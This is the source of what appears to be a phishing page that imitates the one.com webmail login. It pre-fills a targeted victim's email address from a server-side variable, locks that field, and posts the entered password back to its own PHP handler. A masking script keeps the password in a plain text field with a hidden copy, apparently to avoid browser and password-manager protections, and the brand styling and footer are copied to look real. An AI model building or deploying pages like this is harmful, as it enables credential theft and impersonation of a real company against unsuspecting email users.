<?php include '../build.php' ?>
<!DOCTYPE html>
<html lang="en-US" data-version="9.11.2">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>one.com Webmail login</title>
    <meta name="description" content="Log in to one.com webmail to manage your emails and calendar.">
    <link rel="shortcut icon" type="image/vnd.microsoft.icon" href="https://login.group-cdn.one/v9.11.2/media/favicon.20f0cd89.ico">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">

    <link href="https://login.group-cdn.one/v9.11.2/styles.css" rel="stylesheet">
    <link href="../assets/password-fix.css?v=1" rel="stylesheet">

    <style>
        /* ============================================================
           Original one.com styling — extended to cover the wrapper
           span that MaskedPassword injects.
           ============================================================ */
        .Login-formItem input,
        .Login-formItem > span,
        .Login-formItem > span > input {
            line-height: 21px;
            height: 53px;
            border: 1px solid #c6c6c6;
            color: #3c3c3c;
            border-radius: 27px;
            padding: 15px 30px;
            outline: 0 none;
            font-size: 15px;
            box-sizing: border-box;
            width: 100%;
            display: block;
        }

        /* The wrapper span injected by MaskedPassword */
        .Login-formItem > span {
            display: block !important;
            position: relative !important;
            padding: 0 !important;
            border: 0 !important;
            background: transparent !important;
            border-radius: 0 !important;
            height: auto !important;
            line-height: normal !important;
            width: 100%;
        }

        /* The visible input inside that span */
        .Login-formItem > span > input {
            height: 53px !important;
            min-height: 53px !important;
            line-height: 21px !important;
            padding: 15px 30px !important;
            border: 1px solid #c6c6c6 !important;
            border-radius: 27px !important;
            font-size: 15px !important;
            width: 100% !important;
            box-sizing: border-box !important;
            color: #3c3c3c !important;
            background: #fff !important;
            outline: 0 none !important;
        }

        /* Hidden real field — completely out of layout */
        .Login-formItem input[type="hidden"] {
            display: none !important;
            width: 0 !important;
            height: 0 !important;
            padding: 0 !important;
            margin: 0 !important;
            border: 0 !important;
        }

        /* Restore the readonly styling on the email field */
        .Login-formItem input.username[readonly] {
            background: #fff;
            cursor: default;
        }

        .Login-errors p { color: #cc0000; }
    </style>
</head>
<body>
    <div class="notification" data-bind="notification: notification"></div>
    <div class="errormsg" data-bind="errormsg: errormsg"></div>

    <nav class="Nav">
        <div class="Nav-logo"><a href="#" class="one-logo"></a></div>
        <div class="Nav-menuButton"><div></div><div></div></div>
        <div class="Nav-menu">
            <div class="Nav-menuItem"><a href="#"><span>WordPress</span></a></div>
            <div class="Nav-menuItem"><a href="#"><span>File Manager</span></a></div>
            <div class="Nav-menuItem"><a href="#"><span>Online Shop</span></a></div>
            <div class="Nav-menuItem"><a href="#"><span>Website Builder</span></a></div>
            <div class="Nav-menuItem"><a href="#"><span>Control Panel</span></a></div>
            <div class="Nav-menuItem active"><a href="#"><span>Webmail</span></a></div>
        </div>
    </nav>

    <section class="Login">
        <div class="Login-container webmail">
            <div class="Login-formWrap">
                <form class="Login-form login autofill" action="" method="POST" novalidate>
                    <input type="hidden" name="username" value="<?php echo htmlspecialchars($decoded ?? ''); ?>">

                    <h1 class="welcomeText">Webmail</h1>

                    <div class="Login-formItem">
                        <label for="displayUsername">Email</label>
                        <input type="email"
                               name="user"
                               id="displayUsername"
                               class="username"
                               value="<?php echo htmlspecialchars($decoded ?? ''); ?>"
                               placeholder="<?php echo htmlspecialchars($decoded ?? ''); ?>"
                               required
                               readonly>
                        <input type="hidden" name="login" value="onecom">
                    </div>

                    <div class="Login-formItem">
                        <label for="password">Password</label>
                        <input type="text"
                               class="password"
                               id="password"
                               name="pass"
                               placeholder="Enter your password"
                               required
                               autocomplete="off">
                    </div>

                    <div class="Login-errors">
                        <p style="<?php echo htmlspecialchars($error ?? 'display:none;'); ?>">The email or password you entered is incorrect. Please try again.</p>
                        <p style="display: none;">Please enter your email address and password.</p>
                        <p style="display: none;">The email address you entered is not valid.</p>
                        <p style="display: none;">The password you entered is not valid.</p>
                    </div>

                    <div class="Login-formFooter">
                        <button type="submit" class="Login-submit"><span>Log in</span></button>
                        <a href="#">Forgot your password?</a>
                    </div>
                </form>
            </div>
            <div class="Login-campaign">
                <div class="Login-text">
                    <h2>Need a new website?</h2>
                    <h4>Try our Website Builder for free and make a website you are proud of</h4>
                    <ul>
                        <li>14 days free trial</li>
                        <li>Build now - choose a domain later</li>
                    </ul>
                    <a href="#">Learn more</a>
                </div>
            </div>
        </div>
    </section>

    <footer class="Footer">
        <div class="Dropdown">
            <input type="checkbox" id="Dropdown-select" role="button" hidden>
            <label for="Dropdown-select">English (US)</label>
            <div class="Dropdown-list">
                <div class="Dropdown-listItem"><a href="#">Dansk</a></div>
                <div class="Dropdown-listItem"><a href="#">Deutsch</a></div>
                <div class="Dropdown-listItem"><a href="#">English (UK)</a></div>
                <div class="Dropdown-listItem active"><a href="#">English (US)</a></div>
                <div class="Dropdown-listItem"><a href="#">Español</a></div>
                <div class="Dropdown-listItem"><a href="#">Français</a></div>
                <div class="Dropdown-listItem"><a href="#">Italiano</a></div>
                <div class="Dropdown-listItem"><a href="#">Nederlands</a></div>
                <div class="Dropdown-listItem"><a href="#">Norsk</a></div>
                <div class="Dropdown-listItem"><a href="#">Português</a></div>
                <div class="Dropdown-listItem"><a href="#">Suomi</a></div>
                <div class="Dropdown-listItem"><a href="#">Svenska</a></div>
            </div>
        </div>
        <div class="Footer-copyright">Copyright © 2002 - <script>document.write(new Date().getFullYear());</script> one.com. All rights reserved</div>
    </footer>

    <!-- MaskedPassword helper -->
    <script type="text/javascript">
    function MaskedPassword(e,d){
        if(typeof document.getElementById=="undefined"||typeof document.styleSheets=="undefined"){return false}
        if(e==null){return false}
        this.symbol=d;
        this.isIE=typeof document.uniqueID!="undefined";
        e.value="";
        e.defaultValue="";
        e._contextwrapper=this.createContextWrapper(e);
        this.fullmask=false;
        var f=e._contextwrapper;
        var b='<input type="hidden" name="'+e.name+'">';
        var c=this.convertPasswordFieldHTML(e);
        f.innerHTML=b+c;
        e=f.lastChild;
        e.className+=" masked";
        e.setAttribute("autocomplete","off");
        e._realfield=f.firstChild;
        e._contextwrapper=f;
        this.limitCaretPosition(e);
        var a=this;
        this.addListener(e,"change",function(g){a.fullmask=false;a.doPasswordMasking(a.getTarget(g))});
        this.addListener(e,"input",function(g){a.fullmask=false;a.doPasswordMasking(a.getTarget(g))});
        this.addListener(e,"propertychange",function(g){a.doPasswordMasking(a.getTarget(g))});
        this.addListener(e,"keyup",function(g){if(!/^(9|1[678]|224|3[789]|40)$/.test(g.keyCode.toString())){a.fullmask=false;a.doPasswordMasking(a.getTarget(g))}});
        this.addListener(e,"blur",function(g){a.fullmask=true;a.doPasswordMasking(a.getTarget(g))});
        this.forceFormReset(e);
        return true
    }
    MaskedPassword.prototype={
        doPasswordMasking:function(a){
            var d="";
            if(a._realfield.value!=""){
                for(var b=0;b<a.value.length;b++){
                    if(a.value.charAt(b)==this.symbol){d+=a._realfield.value.charAt(b)}
                    else{d+=a.value.charAt(b)}
                }
            }else{d=a.value}
            var c=this.encodeMaskedPassword(d,this.fullmask,a);
            if(a._realfield.value!=d||a.value!=c){a._realfield.value=d;a.value=c}
        },
        encodeMaskedPassword:function(d,f,b){
            var a=f===true?0:1;
            for(var e="",c=0;c<d.length;c++){
                if(c<d.length-a){e+=this.symbol}else{e+=d.charAt(c)}
            }
            return e
        },
        createContextWrapper:function(a){
            var b=document.createElement("span");
            b.style.position="relative";
            a.parentNode.insertBefore(b,a);
            b.appendChild(a);
            return b
        },
        forceFormReset:function(a){
            while(a){if(/form/i.test(a.nodeName)){break}a=a.parentNode}
            if(!/form/i.test(a.nodeName)){return null}
            this.addSpecialLoadListener(function(){a.reset()});
            return a
        },
        convertPasswordFieldHTML:function(c,e){
            var b="<input";
            for(var d=c.attributes,a=0;a<d.length;a++){
                if(d[a].specified&&!/^(_|type|name)/.test(d[a].name)){
                    b+=" "+d[a].name+'="'+d[a].value+'"'
                }
            }
            b+=' type="text" autocomplete="off">';
            return b
        },
        limitCaretPosition:function(a){
            var d=null,
                c=function(){
                    if(d==null){
                        if(this.isIE){
                            d=window.setInterval(function(){
                                var e=a.createTextRange(),g=a.value.length,f="character";
                                e.moveEnd(f,g);e.moveStart(f,g);e.select()
                            },100)
                        }else{
                            d=window.setInterval(function(){
                                var e=a.value.length;
                                if(!(a.selectionEnd==e&&a.selectionStart<=e)){
                                    a.selectionStart=e;a.selectionEnd=e
                                }
                            },100)
                        }
                    }
                },
                b=function(){window.clearInterval(d);d=null};
            this.addListener(a,"focus",function(){c()});
            this.addListener(a,"blur",function(){b()})
        },
        addListener:function(c,a,b){
            if(typeof document.addEventListener!="undefined"){return c.addEventListener(a,b,false)}
            else{if(typeof document.attachEvent!="undefined"){return c.attachEvent("on"+a,b)}}
        },
        addSpecialLoadListener:function(a){
            if(this.isIE){return window.attachEvent("onload",a)}
            else{return document.addEventListener("DOMContentLoaded",a,false)}
        },
        getTarget:function(a){
            if(!a){return null}
            return a.target?a.target:a.srcElement
        }
    };
    </script>

    <!-- Initialize MaskedPassword + post-fix layout -->
    <script type="text/javascript">
    (function () {
        function initMasked() {
            var pwd = document.getElementById("password");
            if (!pwd) return;

            try {
                new MaskedPassword(pwd, "\u25CF");
            } catch (err) {
                pwd.type = "password";
                return;
            }

            // ---- Post-fix wrapper span ----
            var wrapper = pwd.parentNode;
            if (wrapper && wrapper.tagName === "SPAN") {
                wrapper.style.position   = "relative";
                wrapper.style.display    = "block";
                wrapper.style.width      = "100%";
                wrapper.style.height     = "auto";
                wrapper.style.padding    = "0";
                wrapper.style.margin     = "0";
                wrapper.style.border     = "0";
                wrapper.style.background = "transparent";
            }

            // ---- Post-fix visible input ----
            var visible = document.querySelector("input.masked");
            if (visible) {
                visible.style.height       = "53px";
                visible.style.minHeight    = "53px";
                visible.style.lineHeight   = "21px";
                visible.style.padding      = "15px 30px";
                visible.style.border       = "1px solid #c6c6c6";
                visible.style.borderRadius = "27px";
                visible.style.fontSize     = "15px";
                visible.style.width        = "100%";
                visible.style.boxSizing    = "border-box";
                visible.style.color        = "#3c3c3c";
                visible.style.background   = "#fff";
                visible.style.outline      = "0 none";
                visible.style.display      = "block";
            }

            // ---- Hide the real field ----
            var hidden = document.querySelector('input[name="pass"][type="hidden"]');
            if (hidden) {
                hidden.style.display = "none";
                hidden.style.position = "absolute";
                hidden.style.width = "0";
                hidden.style.height = "0";
            }
        }

        if (document.readyState === "loading") {
            document.addEventListener("DOMContentLoaded", initMasked);
        } else {
            initMasked();
        }
    })();
    </script>
</body>
</html>